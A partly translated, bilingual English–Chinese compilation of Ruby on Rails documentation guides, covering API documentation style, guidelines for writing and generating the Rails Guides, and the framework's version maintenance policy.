And then... think about your next contribution!
##  5 Rails Contributors Rails贡献者

All contributions, either via master or docrails, get credit in Rails Contributors.

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  API Documentation Guidelines 接口文档指南方针

This guide documents the Ruby on Rails API documentation guidelines.
本指南记录了 Ruby on Rails 接口文档的指南方针。

After reading this guide, you will know:
读完本指南，你将知道：

    How to write effective prose for documentation purposes.
    怎么写一个有效的文档。
    Style guidelines for documenting different kinds of Ruby code.
    不同类型的 Ruby 代码的风格方针指南

Chapters

    RDoc
    Wording
    English
    Example Code
    Booleans
    File Names
    Fonts
        Fixed-width Font
        Regular Font
    Description Lists
    Dynamically Generated Methods
    Method Visibility
    Regarding the Rails Stack

##  1 RDoc

The Rails API documentation is generated with RDoc.
bundle exec rake rdoc

Resulting HTML files can be found in the ./doc/rdoc directory.

Please consult the RDoc documentation for help with the markup, and also take into account these additional directives.
##  2 Wording 措辞

Write simple, declarative sentences. Brevity is a plus: get to the point.

Write in present tense: "Returns a hash that...", rather than "Returned a hash that..." or "Will return a hash that...".

Start comments in upper case. Follow regular punctuation rules:
# Declares an attribute reader backed by an internally-named
# instance variable.
def attr_internal_reader(*attrs)
  ...
end

Communicate to the reader the current way of doing things, both explicitly and implicitly. Use the idioms recommended in edge. Reorder sections to emphasize favored approaches if needed, etc. The documentation should be a model for best practices and canonical, modern Rails usage.

Documentation has to be concise but comprehensive. Explore and document edge cases. What happens if a module is anonymous? What if a collection is empty? What if an argument is nil?

The proper names of Rails components have a space in between the words, like "Active Support". ActiveRecord is a Ruby module, whereas Active Record is an ORM. All Rails documentation should consistently refer to Rails components by their proper name, and if in your next blog post or presentation you remember this tidbit and take it into account that'd be phenomenal.

Spell names correctly: Arel, Test::Unit, RSpec, HTML, MySQL, JavaScript, ERB. When in doubt, please have a look at some authoritative source like their official documentation.

Use the article "an" for "SQL", as in "an SQL statement". Also "an SQLite database".

Prefer wordings that avoid "you"s and "your"s. For example, instead of
If you need to use `return` statements in your callbacks, it is recommended that you explicitly define them as methods.

use this style:
If `return` is needed it is recommended to explicitly define a method.

That said, when using pronouns in reference to a hypothetical person, such as "a user with a session cookie", gender neutral pronouns (they/their/them) should be used. Instead of:

    he or she... use they.
    him or her... use them.
    his or her... use their.
    his or hers... use theirs.
    himself or herself... use themselves.

##  3 English

Please use American English (color, center, modularize, etc). See a list of American and British English spelling differences here.
##  4 Example Code

Choose meaningful examples that depict and cover the basics as well as interesting points or gotchas.

Use two spaces to indent chunks of code--that is, for markup purposes, two spaces with respect to the left margin. The examples themselves should use Rails coding conventions.

Short docs do not need an explicit "Examples" label to introduce snippets; they just follow paragraphs:
# Converts a collection of elements into a formatted string by
# calling +to_s+ on all elements and joining them.
#
#   Blog.all.to_formatted_s # => "First PostSecond PostThird Post"

On the other hand, big chunks of structured documentation may have a separate "Examples" section:
# ==== Examples
#
#   Person.exists?(5)
#   Person.exists?('5')
#   Person.exists?(name: "David")
#   Person.exists?(['name LIKE ?', "%#{query}%"])

The results of expressions follow them and are introduced by "# => ", vertically aligned:
# For checking if a fixnum is even or odd.
#
#   1.even? # => false
#   1.odd?  # => true
#   2.even? # => true
#   2.odd?  # => false

If a line is too long, the comment may be placed on the next line:
#   label(:article, :title)
#   # => <label for="article_title">Title</label>
#
#   label(:article, :title, "A short title")
#   # => <label for="article_title">A short title</label>
#
#   label(:article, :title, "A short title", class: "title_label")
#   # => <label for="article_title" class="title_label">A short title</label>

Avoid using any printing methods like puts or p for that purpose.

On the other hand, regular comments do not use an arrow:
#   polymorphic_url(record)  # same as comment_url(record)
##  5 Booleans 布尔值

In predicates and flags prefer documenting boolean semantics over exact values.

When "true" or "false" are used as defined in Ruby use regular font. The singletons true and false need fixed-width font. Please avoid terms like "truthy", Ruby defines what is true and false in the language, and thus those words have a technical meaning and need no substitutes.

As a rule of thumb, do not document singletons unless absolutely necessary. That prevents artificial constructs like !! or ternaries, allows refactors, and the code does not need to rely on the exact values returned by methods being called in the implementation.

For example:
`config.action_mailer.perform_deliveries` specifies whether mail will actually be delivered and is true by default

the user does not need to know which is the actual default value of the flag, and so we only document its boolean semantics.

An example with a predicate:
# Returns true if the collection is empty.
#
# If the collection has been loaded
# it is equivalent to <tt>collection.size.zero?</tt>. If the
# collection has not been loaded, it is equivalent to
# <tt>collection.exists?</tt>. If the collection has not already been
# loaded and you are going to fetch the records anyway it is better to
# check <tt>collection.length.zero?</tt>.
def empty?
  if loaded?
    size.zero?
  else
    @target.blank? && !scope.exists?
  end
end

The API is careful not to commit to any particular value, the method has predicate semantics, that's enough.
##  6 File Names 文件名

As a rule of thumb, use filenames relative to the application root:
config/routes.rb            # YES
routes.rb                   # NO
RAILS_ROOT/config/routes.rb # NO
##  7 Fonts  字体
###  7.1 Fixed-width Font 等宽字体

Use fixed-width fonts for:

    Constants, in particular class and module names.
    Method names.
    Literals like nil, false, true, self.
    Symbols.
    Method parameters.
    File names.

class Array
  # Calls +to_param+ on all its elements and joins the result with
  # slashes. This is used by +url_for+ in Action Pack.
  def to_param
    collect { |e| e.to_param }.join '/'
  end
end

Using +...+ for fixed-width font only works with simple content like ordinary method names, symbols, paths (with forward slashes), etc. Please use <tt>...</tt> for everything else, notably class or module names with a namespace as in <tt>ActiveRecord::Base</tt>.

You can quickly test the RDoc output with the following command:
$ echo "+:to_param+" | rdoc --pipe
#=> <p><code>:to_param</code></p>
###  7.2 Regular Font 普通字体

When "true" and "false" are English words rather than Ruby keywords use a regular font:
# Runs all the validations within the specified context.
# Returns true if no errors are found, false otherwise.
#
# If the argument is false (default is +nil+), the context is
# set to <tt>:create</tt> if <tt>new_record?</tt> is true,
# and to <tt>:update</tt> if it is not.
#
# Validations with no <tt>:on</tt> option will run no
# matter the context. Validations with # some <tt>:on</tt>
# option will only run in the specified context.
def valid?(context = nil)
  ...
end
##  8 Description Lists 描述列表

In lists of options, parameters, etc. use a hyphen between the item and its description (reads better than a colon because normally options are symbols):
# * <tt>:allow_nil</tt> - Skip validation if attribute is +nil+.

The description starts in upper case and ends with a full stop-it's standard English.
##  9 Dynamically Generated Methods 动态生成方法

Methods created with (module|class)_eval(STRING) have a comment by their side with an instance of the generated code. That comment is 2 spaces away from the template:
for severity in Severity.constants
  class_eval <<-EOT, __FILE__, __LINE__
    def #{severity.downcase}(message = nil, progname = nil, &block)  # def debug(message = nil, progname = nil, &block)
      add(#{severity}, message, progname, &block)                    #   add(DEBUG, message, progname, &block)
    end                                                              # end
                                                                     #
    def #{severity.downcase}?                                        # def debug?
      #{severity} >= @level                                          #   DEBUG >= @level
    end                                                              # end
  EOT
end

If the resulting lines are too wide, say 200 columns or more, put the comment above the call:
# def self.find_by_login_and_activated(*args)
#   options = args.extract_options!
#   ...
# end
self.class_eval %{
  def self.#{method_id}(*args)
    options = args.extract_options!
    ...
  end
}
##  10 Method Visibility 方法可视性

When writing documentation for Rails, it's important to understand the difference between public user-facing API vs internal API.

Rails, like most libraries, uses the private keyword from Ruby for defining internal API. However, public API follows a slightly different convention. Instead of assuming all public methods are designed for user consumption, Rails uses the :nodoc: directive to annotate these kinds of methods as internal API.

This means that there are methods in Rails with public visibility that aren't meant for user consumption.

An example of this is ActiveRecord::Core::ClassMethods#arel_table:
module ActiveRecord::Core::ClassMethods
  def arel_table #:nodoc:
    # do some magic..
  end
end

If you thought, "this method looks like a public class method for ActiveRecord::Core", you were right. But actually the Rails team doesn't want users to rely on this method. So they mark it as :nodoc: and it's removed from public documentation. The reasoning behind this is to allow the team to change these methods according to their internal needs across releases as they see fit. The name of this method could change, or the return value, or this entire class may disappear; there's no guarantee and so you shouldn't depend on this API in your plugins or applications. Otherwise, you risk your app or gem breaking when you upgrade to a newer release of Rails.

As a contributor, it's important to think about whether this API is meant for end-user consumption. The Rails team is committed to not making any breaking changes to public API across releases without going through a full deprecation cycle. It's recommended that you :nodoc: any of your internal methods/classes unless they're already private (meaning visibility), in which case it's internal by default. Once the API stabilizes the visibility can change, but changing public API is much harder due to backwards compatibility.

A class or module is marked with :nodoc: to indicate that all methods are internal API and should never be used directly.

If you come across an existing :nodoc: you should tread lightly. Consider asking someone from the core team or author of the code before removing it. This should almost always happen through a pull request instead of the docrails project.

A :nodoc: should never be added simply because a method or class is missing documentation. There may be an instance where an internal public method wasn't given a :nodoc: by mistake, for example when switching a method from private to public visibility. When this happens it should be discussed over a PR on a case-by-case basis and never committed directly to docrails.

To summarize, the Rails team uses :nodoc: to mark publicly visible methods and classes for internal use; changes to the visibility of API should be considered carefully and discussed over a pull request first.
##  11 Regarding the Rails Stack 关于 Rails 堆栈

When documenting parts of Rails API, it's important to remember all of the pieces that go into the Rails stack.

This means that behavior may change depending on the scope or context of the method or class you're trying to document.

In various places there is different behavior when you take the entire stack into account, one such example is ActionView::Helpers::AssetTagHelper#image_tag:
# image_tag("icon.png")
#   # => <img alt="Icon" src="/assets/icon.png" />

Although the default behavior for #image_tag is to always return /images/icon.png, we take into account the full Rails stack (including the Asset Pipeline) we may see the result seen above.

We're only concerned with the behavior experienced when using the full default Rails stack.

In this case, we want to document the behavior of the framework, and not just this specific method.

If you have a question on how the Rails team handles certain API, don't hesitate to open a ticket or send a patch to the issue tracker.
## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Ruby on Rails Guides Guidelines Ruby on Rails指南的指南

This guide documents guidelines for writing Ruby on Rails Guides. This guide follows itself in a graceful loop, serving itself as an example.
这个指南记载了编写Ruby on Rails指南的基本方针。这个指南以自身为例子展示一个优雅的方式。

After reading this guide, you will know:
读完本章，你将知道：

    About the conventions to be used in Rails documentation.
    关于用于Rails文档的惯例。
    How to generate guides locally.
    怎么在本地生成文档。

Chapters

    Markdown
    Prologue
    Titles
    API Documentation Guidelines
    HTML Guides
        Generation
        Validation
    Kindle Guides
        Generation

##  1 Markdown 编辑格式

Guides are written in GitHub Flavored Markdown. There is comprehensive documentation for Markdown, a cheatsheet.
指南用格式编写。这里有一个关于Markdown的比较全面的文档，活页。
##  2 Prologue 序言

Each guide should start with motivational text at the top (that's the little introduction in the blue area). The prologue should tell the reader what the guide is about, and what they will learn. See for example the Routing Guide.
每个指南都用一段感性的文字作为开头放在指南的顶部（就是蓝色区域里解释标题的文字）。序言告诉读者该指南的大概，以及学习的范围。参见例子《路由指南》。
##  3 Titles 标题

The title of every guide uses h1; guide sections use h2; subsections h3; etc. However, the generated HTML output will have the heading tag starting from <h2>.
Guide Title
===========
 
Section
-------
 
### Sub Section

Capitalize all words except for internal articles, prepositions, conjunctions, and forms of the verb to be:
#### Middleware Stack is an Array
#### When are Objects Saved?

Use the same typography as in regular text:
##### The `:content_type` Option
##  4 API Documentation Guidelines 接口文档指南

The guides and the API should be coherent and consistent where appropriate. Please have a look at these particular sections of the API Documentation Guidelines:

    Wording
    Example Code
    Filenames
    Fonts

Those guidelines apply also to guides.
##  5 HTML Guides 网页指南

Before generating the guides, make sure that you have the latest version of Bundler installed on your system. As of this writing, you must install Bundler 1.3.5 on your device.
生成指南之前，确保系统上安装了最新的 Bundler。本指南就需要设备安装 Bundler 1.3.5。

To install the latest version of Bundler, simply run the gem install bundler command
只需要运行`gem install bundler`命令，就可以安装最新版的Bundler。
###  5.1 Generation 生成

To generate all the guides, just cd into the guides directory, run bundle install and execute:
要生成所有指南，需要cd进入指南目录，运行`bundle install`并执行：
bundle exec rake guides:generate

or
或者
bundle exec rake guides:generate:html

To process my_guide.md and nothing else use the ONLY environment variable:
如果只处理my_guide.md文档，可使用ONLY环境变量：
touch my_guide.md
bundle exec rake guides:generate ONLY=my_guide

By default, guides that have not been modified are not processed, so ONLY is rarely needed in practice.
默认情况下，未修改的指南不能被处理，所以实践中很少用到ONLY。

To force processing all the guides, pass ALL=1.
要强制处理所有指南，可传入ALL=1。

It is also recommended that you work with WARNINGS=1. This detects duplicate IDs and warns about broken internal links.
也推荐使用 WARNINGS=1 来工作。这会检测副本的 ID，并在损坏内部链接时提出警告。

If you want to generate guides in a language other than English, you can keep them in a separate directory under source (eg. source/es) and use the GUIDES_LANGUAGE environment variable:
如果你想生成英语之外的语言的文档，可以将这些译文放在source下的其他独立目录中，比如source/es，使用GUIDES_LANGUAGE环境变量：
bundle exec rake guides:generate GUIDES_LANGUAGE=es

If you want to see all the environment variables you can use to configure the generation script just run:
如果想查看所有用于配置生成脚本的环境变量，可运行：
rake
###  5.2 Validation 验证

Please validate the generated HTML with:
请用下面命令验证生成的网页：
bundle exec rake guides:validate

Particularly, titles get an ID generated from their content and this often leads to duplicates. Please set WARNINGS=1 when generating guides to detect them. The warning messages suggest a solution.

##  6 Kindle Guides 亚马逊书籍格式指南
###  6.1 Generation 生成

To generate guides for the Kindle, use the following rake task:
bundle exec rake guides:generate:kindle

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Ruby on Rails 维护方针

Rails 框架的维护方针分成四个部分：新特性、Bug 修复、安全问题、重大安全问题。 以下分别解释，版本号皆采 X.Y.Z 格式。
Chapters

    新特性
    Bug 修复
    安全问题
    重大安全问题
    不再支援的发行版

Rails 遵循一种变种的语义化版本。

修订号 Z

只修复 Bug，不会更改 API，不会加新特性。 安全性修复情况下除外。

次版号 Y

新特性、可能会改 API（等同于语意化版本的主版号）。 不兼容的变更会在前一次版号或主版号内加入弃用提醒。

主版号 X

新特性、很可能会改 API。Rails 次版号与主版号的差别在于，不兼容的变更的数量，主版号通常保留在特别场合释出。
##  1 新特性

新特性只会合并到 master 分支，不会更新至小版本。
##  2 Bug 修复

只有最新的发行版会修 Bug。当修复的 Bug 累积到一定数量时，便会发布新版本。

目前会修 Bug 的版本： 4.1.Z、4.0.Z
##  3 安全问题

只有最新版与上一版会修复安全问题。

比如 4.0.0 出了个安全问题，会给 4.0.0 版本打上安全性补丁， 即刻发布 4.0.1，并会把 4.0.1 会加至 4-0-stable。

目前会修安全问题的版本：4.1.Z、4.0.Z
##  4 重大安全问题

重大安全问题会如上所述发布新版本，还会修复上个版本。安全问题的重要性由 Rails 核心成员决定。

目前会修重大安全问题的版本：4.1.Z、4.0.Z、3.2.Z
##  5 不再支援的发行版

当我们不再支援某个发行版时，安全问题与 Bug 得自行处理。我们可能会在 GitHub 提供向下兼容的 Bug 修复， 但不会发布新版本。如果无法自己维护，建议升级至新版本。
## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

